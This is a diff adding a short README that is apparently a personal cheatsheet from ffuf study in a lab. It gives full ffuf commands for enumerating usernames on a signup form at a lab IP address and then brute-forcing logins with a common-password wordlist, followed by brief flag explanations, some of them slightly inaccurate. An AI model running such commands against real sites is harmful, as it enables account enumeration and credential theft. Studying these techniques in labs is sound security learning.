@@ -1,0 +1,24 @@
+# ccsffuf
+
+> Shows the cheatsheet of my ffuf studies
+
+- Example of a brute force attact to the username of a website, returning all cases that has a reply from the http status 200.
+`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.174.181/customers/signup -mr "username already exists"`
+
+- Example of a brute force password and username attack using the username I discovered before.
+`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.174.181/customers/login -fc 200`
+
+------ FFUF COMMANDS --------
+
+
+`-w <file location on the computer that contains the list of usernames that we're going to check exists>`
+`-x <Request method (POST or GET)>`
+
+- In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request.
+`-d <data that we are going to send> (EX. "username=FUZZ&email=x&password=x&cpassword=&"`
+
+`-H <Aditional headers to the request>
+`-u <Url we are making the request>`
+`-mr <text on the page we are looking for to validate we've found a valid username>`
+`-fc <check for an HTTP status code other than 200>`
+
